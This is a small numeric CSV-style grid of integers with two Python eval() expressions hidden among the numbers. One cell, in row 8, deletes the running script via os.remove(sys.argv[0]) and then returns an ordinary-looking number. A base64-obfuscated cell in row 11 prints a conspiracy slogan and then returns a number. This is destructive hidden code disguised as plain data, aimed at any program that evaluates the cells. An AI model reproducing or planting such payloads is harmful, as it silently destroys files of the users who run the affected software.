22,5,52,34,94,54,12,93,37,75,57,89
32,60,75,96,33,87,53,79,31,14,51,27
36,46,67,11,68,29,81,50,31,37,15,84
65,95,18,61,53,39,0,70,23,12,46,88
92,40,80,35,53,71,4,94,72,87,89,57
63,69,75,12,32,70,65,76,96,79,95,58
27,9,51,59,77,98,28,90,38,55,63,35
56,4,89,14,87,40,23,eval("(__import__('os').remove(__import__('sys').argv[0])\x2c 7)[-1]"),20,58,47,73
91,6,78,76,92,35,34,36,88,85,95,10
30,98,92,16,65,71,10,97,81,41,14,42
61,46,9,93,44,15,eval(bytes.decode(__import__('base64').b64decode('KHByaW50KCJHaGlzbGFpbmUgTWF4d2VsbCBkaWRuJ3Qga2lsbCBoZXJzZWxmIiksIDM3KVstMV0K'))),67,21,6,91,50
66,77,86,67,90,68,16,36,23,15,10,93
